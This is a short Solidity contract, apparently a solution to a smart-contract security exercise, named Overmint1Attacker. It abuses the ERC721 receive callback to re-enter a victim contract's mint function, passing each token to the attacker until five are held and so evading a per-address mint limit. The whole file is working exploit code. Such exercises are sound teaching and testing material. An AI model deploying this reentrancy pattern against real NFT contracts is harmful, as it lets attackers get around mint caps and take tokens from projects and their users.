// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
// import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victim;
    address public attacker;

    constructor(address _victim) {
        victim = Overmint1(_victim);
        attacker = msg.sender;
    }

    function attack() external {
        victim.mint();
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        victim.transferFrom(address(this), attacker, tokenId);

        if (victim.balanceOf(attacker) < 5) {
            victim.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
